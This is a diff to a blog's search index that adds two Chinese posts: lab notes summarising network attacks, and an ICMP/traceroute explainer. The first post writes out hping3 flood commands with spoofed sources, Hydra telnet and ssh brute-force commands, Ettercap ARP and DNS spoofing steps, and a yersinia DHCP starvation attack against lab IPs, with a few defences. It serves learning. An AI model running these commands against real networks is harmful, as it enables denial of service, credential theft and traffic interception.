@@ -4,6 +4,38 @@
   
     
     <entry>
+      <title>攻击操作汇总</title>
+      <link href="/2022/07/23/%E6%94%BB%E5%87%BB%E6%93%8D%E4%BD%9C%E6%B1%87%E6%80%BB/"/>
+      <url>/2022/07/23/%E6%94%BB%E5%87%BB%E6%93%8D%E4%BD%9C%E6%B1%87%E6%80%BB/</url>
+      
+        <content type="html"><![CDATA[<h3 id="攻击操作汇总（1）"><a href="#攻击操作汇总（1）" class="headerlink" title="攻击操作汇总（1）"></a>攻击操作汇总（1）</h3><h4 id="一、使用hping3进行泛洪攻击"><a href="#一、使用hping3进行泛洪攻击" class="headerlink" title="一、使用hping3进行泛洪攻击"></a>一、使用hping3进行泛洪攻击</h4><p><strong>简介：</strong>hping是面向命令行的用于生成和解析TCP&#x2F;IP协议数据包汇编&#x2F;分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，目前最新版是hping3，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测</p><ol><li><p><strong>ICMP攻击</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo hping3 --icmp --rand-source --flood 192.168.43.175</span><br></pre></td></tr></table></figure></li><li><p><strong>UDP攻击</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo hping3 -a 8.8.8.8 --udp -p 444 --flood 192.168.43.175</span><br></pre></td></tr></table></figure></li><li><p><strong>SYN攻击</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo hping3 -a 8.8.8.8 -S -p 888 --flood 192.168.43.175  <span class="comment"># -S 采用SYN攻击</span></span><br></pre></td></tr></table></figure></li><li><p><strong>ACK攻击</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo hping3 -a 8.8.8.8 -A -p 888 --flood 192.168.43.175</span><br></pre></td></tr></table></figure></li></ol><h4 id="二、使用Hydra进行弱口令爆破"><a href="#二、使用Hydra进行弱口令爆破" class="headerlink" title="二、使用Hydra进行弱口令爆破"></a>二、使用Hydra进行弱口令爆破</h4><p><strong>简介：</strong>Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。Hydra是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。</p><ol><li><p><strong>telnet口令爆破</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt 192.168.43.175 telnet  <span class="comment"># -L 加载账号字典 -P 加载密码字典 telnet 指定爆破协议（端口）</span></span><br></pre></td></tr></table></figure></li><li><p><strong>ssh口令爆破</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P passwd.txt 192.168.43.175 ssh  <span class="comment"># -l 指定用户名 -P 加载密码字典 ssh 指定爆破协议 （端口）</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="三、使用Ettercap进行中间人攻击"><a href="#三、使用Ettercap进行中间人攻击" class="headerlink" title="三、使用Ettercap进行中间人攻击"></a>三、使用Ettercap进行中间人攻击</h4><ol><li><p><strong>ARP欺骗</strong></p><p>攻击：打开图形化Ettercap，嗅探主机，将攻击对象地址添加target1，将伪装地址添加target2，实施ARP欺骗（ARP poisoning）</p><p>防御：</p><ul><li><p>安全软件及防火墙</p></li><li><p>电脑和网关路由器进行ARP双向绑定</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp -s 192.168.1.1 00-11-22-a1-c6-09</span><br></pre></td></tr></table></figure></li><li><p>网络设备（交换机或者路由器）开启动态ARP检测技术（对arp地址变更者进行判定及惩罚）。</p></li></ul></li><li><p><strong>DNS欺骗</strong></p><p>攻击：先实施ARP欺骗，如1步骤所示，然后编辑ettercap配置文件（&#x2F;etc&#x2F;ettercap&#x2F;etter.dns)，添加如下内容，最后点击插件中的dns_spoof。如果kali机开启apache2服务，则所有主机上网均会指向apache2的页面。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* A 192.168.71.11  <span class="comment"># *代表诱导所有IP指向虚假A记录，后面的IP即是虚假DNS服务器IP（中间人）</span></span><br></pre></td></tr></table></figure><p><strong>避坑：</strong></p><ul><li>做实验时尽可能先清空dns缓存及浏览器上的数据缓存，以免影响实验。（无法上网时也可使用此方法排错）</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure><ul><li>win10如果手动设置DNS，需要将网关也添加到DNS中，再加一个DNS服务器（还不清楚为什么），否则无法上网。</li></ul></li></ol><h4 id="四、使用yersinia进行DHCP泛洪攻击"><a href="#四、使用yersinia进行DHCP泛洪攻击" class="headerlink" title="四、使用yersinia进行DHCP泛洪攻击"></a>四、使用yersinia进行DHCP泛洪攻击</h4><p><strong>discover泛洪攻击：</strong></p><p>攻击者：kali；   受害者：windows10（使用DHCP）获取地址</p><p>运行kali里面的yersinia工具，发起discover泛洪攻击，耗尽ip地址</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yersinia -G  <span class="comment"># G代表图形化</span></span><br></pre></td></tr></table></figure><p>此时win10若释放ip，将无法再获取到ip</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipconfig /release</span><br><span class="line">ipconfig /renew</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ICMP基础知识</title>
+      <link href="/2022/07/21/ICMP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+      <url>/2022/07/21/ICMP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+      
+        <content type="html"><![CDATA[<p>参考知乎文章：<a href="https://zhuanlan.zhihu.com/p/254762952">https://zhuanlan.zhihu.com/p/254762952</a></p><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><ol><li><p><strong>ICMP</strong> 全称 <strong>Internet Control Message Protocol</strong>，就是<strong>网际控制报文协议</strong>。ICMP 报文是封装在 IP 包里面的，因为传输指令的时候，肯定需要源地址和目标地址。</p></li><li><p>ICMP报文有很多的类型，<strong>主要分为两类，查询报文类型和差错报告报文类型</strong>。</p></li><li><p>查询报文类型简单来说就是查询方主动发送侦查协议，等待对方的应答。具体例子，见下面 ping 的使用；</p><p>差错报文类型会使用 ICMP 的规则，<strong>故意制造一些能够产生错误的场景</strong>，从而达到网络诊断的目的。具体例子，见下面 traceroute 的使用。</p></li><li><p><strong>ping</strong> 这个程序是使用了 ICMP 里面的 ECHO REQUEST（8） 和 ECHO REPLY （0）类型的。经常会遇到一个问题，如果不在我们的控制范围内，很多中间设备都是禁止 ping 的，<strong>但是 ping 不通不代表网络不通</strong>。这个时候就要使用 telnet，通过其他协议来测试网络是否通。</p></li><li><p>差错报文类型会使用 ICMP 规则故意制造一些能够产生错误的场景。<strong>Traceroute</strong> 故意设置特殊的 TTL，来追踪去往目的地时沿途经过的路由器。<strong>Traceroute 的参数指向某个目的IP地址，它会发送一个 UDP 的数据包</strong>。将 TTL 设置成1，也就是说一旦遇到一个路由器或者一个关卡，就表示它“牺牲”了，于是，返回一个ICMP包，也就是网络差错包，类型是时间超时。接下来将将 TTL 设置为 2，第一关过了第二关又“牺牲了”，依次类推，直到到达目的主机。这样，Traceroute 就拿到了所有的路由器 IP。<strong>当然，有的路由器压根不会回这个 ICMP。这也是 Traceroute一个公网的地址，看不到中间路由的原因。</strong></p><p>那又是怎么知道 UDP 有没有到达目的主机呢？Traceroute 程序会发送一份UDP 数据报给目的主机，<strong>但它会选择一个不可能的值作为 UDP 端口号（大于 30000 ）</strong>。当该数据报到达时，将使目的主机的 UDP 模块产生一份“端口不可达”错误 ICMP 报文。如果数据报没有到达，则可能是超时。</p></li><li><p>ICMP差错报告报文共有5种类型：</p><ul><li><strong>终点不可达</strong>。当路由器或者主机不能交付数据报时就像源点发送终点不可达报文。</li><li><strong>源点抑制</strong>。当路由器或者主机由于拥塞而丢弃数据报时，就向源点发送源点抑制报文，使源点知道应当把数据报的发送率放慢</li><li><strong>时间超过</strong>。当路由器受到生存时间TTL为零的数据报时，除丢弃该数据报外，还要向源点发送时间超过报文。当终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发送时间超过报文。</li><li><strong>参数问题</strong>。当路由器或者目的主机收到的数据报的首部中的字段值不正确时，就丢弃该数据报，并向源点发送参数问题报文。</li><li><strong>重定向</strong>。路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器（可通过更好的路由）。</li></ul></li></ol>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> -网络 -协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Hello World</title>
       <link href="/2022/02/14/hello-world/"/>
       <url>/2022/02/14/hello-world/</url>
